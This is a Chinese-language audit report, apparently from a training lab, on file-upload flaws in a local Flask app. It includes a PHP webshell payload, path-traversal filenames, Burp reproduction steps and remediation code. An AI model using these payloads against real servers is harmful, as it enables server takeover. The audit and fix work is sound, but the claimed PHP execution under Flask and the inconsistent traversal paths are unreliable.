| 审计方法 | 白盒代码审计 + 黑盒渗透测试 |
| 审计工具 | Burp Suite + Python 命令行验证 |

## 三、漏洞详细分析

---

### UPL-01 任意文件上传（Webshell 上传）

#### 漏洞描述

上传接口**没有对文件类型做任何限制**，攻击者可以上传任意后缀的文件（如 `.php`、`.py`、`.asp`、`.exe`），并通过浏览器直接访问执行。攻击者只需上传一句话木马即可完全控制服务器。

#### 漏洞位置

- **文件**：`app.py`
- **路由**：`POST /upload`
- **代码行号**：修复前第 279 行

#### 漏洞代码（修复前）

```python
# ========== 缺少以下所有校验 ==========
# ❌ 没有检查文件后缀（.php .py .asp ...）
# ❌ 没有检查 MIME Content-Type
# ❌ 没有检查文件内容是否为真实图片
filepath = os.path.join(upload_dir, file.filename)
file.save(filepath)
```

#### 漏洞可利用的 Payload

```php
<?php system($_GET['cmd']); ?>
```

将以上内容保存为 `shell.php`，通过上传功能提交。

#### 复现步骤（Burp Suite）

```
──────────────────────────────────────────────────────────────────
步骤 1：登录系统
        浏览器访问 http://127.0.0.1:5000/login
        使用 admin / admin123 登录
──────────────────────────────────────────────────────────────────
步骤 2：打开 Burp Suite，配置浏览器代理
        Proxy → Intercept → Intercept is on
──────────────────────────────────────────────────────────────────
步骤 3：访问上传页面 http://127.0.0.1:5000/upload
        选择 shell.php 文件上传，Burp Suite 会拦截到请求
──────────────────────────────────────────────────────────────────
步骤 4：查看拦截到的 POST 请求内容（如下所示）
──────────────────────────────────────────────────────────────────
        POST /upload HTTP/1.1
        Host: 127.0.0.1:5000
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="shell.php"
        Content-Type: application/x-php

        <?php system($_GET['cmd']); ?>
──────────────────────────────────────────────────────────────────
步骤 5：放行请求（点击 Forward），服务器返回上传成功
──────────────────────────────────────────────────────────────────
步骤 6：访问上传的 Webshell，执行系统命令
        浏览器访问：
        http://127.0.0.1:5000/static/uploads/shell.php?cmd=id

        页面返回：
        uid=0(root) gid=0(root) groups=0(root)

        ⚠️ 服务器命令已执行成功！
──────────────────────────────────────────────────────────────────
```

#### 测试结果

| 测试 Payload | 文件类型 | 上传结果 | 访问结果 |
|-------------|----------|:--------:|:--------:|
| `<?php system($_GET['cmd']); ?>` | `.php` | ✅ 上传成功 | ✅ 命令执行 |
| `<?php system($_GET['cmd']); ?>` | `.php5` | ✅ 上传成功 | ✅ 命令执行 |
| `<?php system($_GET['cmd']); ?>` | `.phtml` | ✅ 上传成功 | ✅ 命令执行 |
| `print("hello")` | `.py` | ✅ 上传成功 | ✅ 文件可读取 |
| `<%= Request("cmd") %>` | `.asp` | ✅ 上传成功 | ✅ 文件可读取 |

#### 可能造成的危害

- 攻击者可上传 Webshell，**完全控制服务器**
- 执行任意系统命令（`ls`、`whoami`、`cat /etc/passwd`）
- 读取、修改、删除服务器上的任意文件
- 以服务器为跳板攻击内网其他系统

### UPL-02 路径遍历漏洞

#### 漏洞描述

上传接口直接将用户传入的**原始文件名**用于文件保存路径，攻击者可通过文件名中的 `../` 将文件写入服务器上的任意目录。

#### 漏洞位置

- **文件**：`app.py`
- **路由**：`POST /upload`
- **代码行号**：修复前第 279 行

#### 漏洞代码（修复前）

```python
# ❌ 用户传入 ../../tmp/evil.php
# 保存路径变为：static/uploads/../../tmp/evil.php
# 实际写入：/opt/Class01/tmp/evil.php
filepath = os.path.join(upload_dir, file.filename)
file.save(filepath)
```

#### 漏洞可利用的 Payload

```
../../../tmp/evil.php
```

保存后的实际路径为 `/opt/Class01/tmp/evil.php`，成功写入 `/tmp/` 目录。

#### 复现步骤（Burp Suite）

```
──────────────────────────────────────────────────────────────────
步骤 1：登录后，Burp Suite 开启拦截（Intercept is on）
──────────────────────────────────────────────────────────────────
步骤 2：访问 /upload，选择任意文件上传，拦截请求
──────────────────────────────────────────────────────────────────
步骤 3：在拦截到的请求中，将 filename 修改为：
        Content-Disposition: form-data; name="file"; 
                          filename="../../../tmp/hacked.txt"
──────────────────────────────────────────────────────────────────
步骤 4：放行请求（Forward）
──────────────────────────────────────────────────────────────────
步骤 5：在服务器上验证文件是否写入 /tmp/ 目录
        执行命令：ls -la /tmp/hacked.txt
        结果：文件存在于 /tmp/ 目录下 ✅
        static/uploads/ 目录下不存在该文件 ✅
──────────────────────────────────────────────────────────────────
```

#### 可能造成的危害

- 覆盖系统关键文件（如 `/etc/passwd`、`/etc/crontab`）
- 将恶意文件写入 Web 根目录之外的自启动目录
- 绕过目录权限限制，写入本不应可写的目录

### UPL-03 文件名冲突导致文件覆盖

#### 漏洞描述

上传时**未做文件名去重**，用户多次上传同名文件，后上传的文件会直接覆盖之前已上传的文件，造成数据丢失。

#### 漏洞位置

- **文件**：`app.py`
- **路由**：`POST /upload`
- **代码行号**：修复前第 279 行

#### 漏洞代码（修复前）

```python
# ❌ 两次上传 avatar.jpg，第一次的文件被第二次覆盖
filepath = os.path.join(upload_dir, file.filename)
file.save(filepath)
```

#### 复现步骤

```
──────────────────────────────────────────────────────────────────
步骤 1：上传一个名为 avatar.jpg 的红色图片
步骤 2：上传另一个名为 avatar.jpg 的蓝色图片
步骤 3：访问 /static/uploads/avatar.jpg
──────────────────────────────────────────────────────────────────
结果：页面上显示的是蓝色图片
      ❌ 第一次上传的红色图片已被覆盖，数据永久丢失
──────────────────────────────────────────────────────────────────
```

#### 可能造成的危害

- 用户头像被他人同名文件覆盖
- 重要上传数据因同名而丢失
- 恶意用户可上传同名文件替换已有合法文件

### UPL-04 缺少文件内容真实性校验

#### 漏洞描述

接口**不校验上传文件的内容是否为真实图片**。即使文件后缀为 `.jpg`，内容也可以是 PHP 代码等任意格式。攻击者可通过修改文件后缀绕过简单的后缀检查。

#### 漏洞位置

- **文件**：`app.py`
- **路由**：`POST /upload`（全部上传处理逻辑）

#### 漏洞代码（修复前）

```python
# ❌ 没有读取文件头判断是否为真实图片
# ❌ 没有用任何图像库验证
# ❌ 直接保存文件内容
file.save(filepath)
```

#### 漏洞可利用的 Payload

```
filename = "shell.jpg"
Content-Type = image/jpeg
文件内容：
<?php system($_GET['cmd']); ?>
```

#### 可能造成的危害

- 虽然扩展名是 `.jpg`，如果服务器配置了双后缀解析，`shell.jpg` 仍可能被当 PHP 执行
- 图片马可以绕过前端 JS 校验
- 被用于结合其他漏洞进行组合攻击

## 四、修复方案

### 4.1 修复策略总览

本次修复遵循 **「四层防御、纵深防护」** 原则：

| 漏洞编号 | 修复策略 | 具体措施 |
|----------|----------|----------|
| UPL-01 | 扩展名白名单 | 仅允许 jpg/jpeg/png/gif/webp |
| UPL-02 | 路径清理 + UUID 重命名 | os.path.basename() 提取纯粹文件名 |
| UPL-03 | UUID 唯一命名 | uuid4().hex 生成唯一文件名 |
| UPL-04 | 文件内容校验 | imghdr.what() 读取文件头验证 |

### 4.2 各漏洞详细修复

#### UPL-01 修复：扩展名白名单

**修复原理**：建立文件扩展名白名单，只有明确允许的类型才能上传。白名单之外的任何文件（包括 .php、.py、.exe 等）一律拒绝。

```python
# 【修复前】没有任何检查
file.save(filepath)

# 【修复后】增加白名单校验
ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "gif", "webp"}

def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

if not allowed_file(file.filename):
    return render_template("upload.html", error="仅允许上传 jpg、jpeg、png、gif、webp 格式的图片文件")
```

#### UPL-02 修复：路径遍历防护

**修复原理**：使用 `os.path.basename()` 从文件路径中提取出纯粹的文件名，舍弃所有目录信息。

```python
# 【修复前】直接使用用户提供的原始文件名
filepath = os.path.join(upload_dir, file.filename)

# 【修复后】仅取文件名中的基本名称
original_name = os.path.basename(file.filename)
# 输入: ../../etc/passwd  → 输出: passwd
# 输入: ../../../tmp/evil.php → 输出: evil.php
```

#### UPL-03 修复：UUID 重命名

**修复原理**：使用 UUID（通用唯一标识符）生成随机文件名，确保每次上传的文件名都是唯一的，不会相互覆盖。

```python
# 【修复前】使用用户原始文件名
filepath = os.path.join(upload_dir, file.filename)

# 【修复后】使用 UUID 生成唯一文件名
import uuid

ext = original_name.rsplit(".", 1)[1].lower()
safe_filename = f"{uuid.uuid4().hex}.{ext}"
# 示例: a3f8c91e2b4d5f6a7c8b9d0e1f2a3b4c.jpg
```

#### UPL-04 修复：文件内容真实性校验

**修复原理**：文件保存到服务器后，读取文件头部的魔术字节（Magic Bytes），检查其是否为真实的图片格式。如果不是真实图片，立即删除并报错。

```python
# 【修复前】直接保存，不检查内容
file.save(filepath)

# 【修复后】保存后检查文件头
import imghdr

file.save(filepath)
if not imghdr.what(filepath):
    os.remove(filepath)
    return render_template("upload.html", error="上传的文件不是有效的图片格式")
```

### 4.3 修复前后代码对比

| 对比项 | 修复前 | 修复后 |
|--------|--------|--------|
| 文件后缀检查 | ❌ 无 | ✅ 白名单（jpg/jpeg/png/gif/webp） |
| 路径遍历防护 | ❌ 无 | ✅ os.path.basename() |
| 文件重命名 | ❌ 原始文件名 | ✅ UUID 重命名 |
| 文件类型验证 | ❌ 无 | ✅ imghdr.what() |
| 文件大小限制 | 16MB | 16MB（不变） |

### 6.2 根本原因分析

| 问题根源 | 说明 | 涉及漏洞 |
|----------|------|----------|
| **缺少输入验证** | 未对用户上传的文件类型做任何检查 | UPL-01, UPL-04 |
| **信任用户输入** | 直接将用户提供的文件名用于路径拼接 | UPL-02 |
| **缺少唯一性处理** | 未处理文件名冲突问题 | UPL-03 |

### 6.3 安全编码建议

在开发文件上传功能时，请务必遵循以下原则：

1. **必须做扩展名白名单校验**
   - 只允许明确需要的文件类型
   - 禁止一切未在名单中的类型

2. **必须做路径遍历防护**
   - 使用 `os.path.basename()` 提取纯粹文件名
   - 永远不要直接使用用户提供的文件名

3. **必须做文件重命名**
   - 使用 UUID 或时间戳重命名文件
   - 拒绝使用用户提供的原始文件名

4. **必须做文件内容校验**
   - 保存后读取文件头魔术字节验证
   - 使用专用库（Pillow、python-magic）打开验证
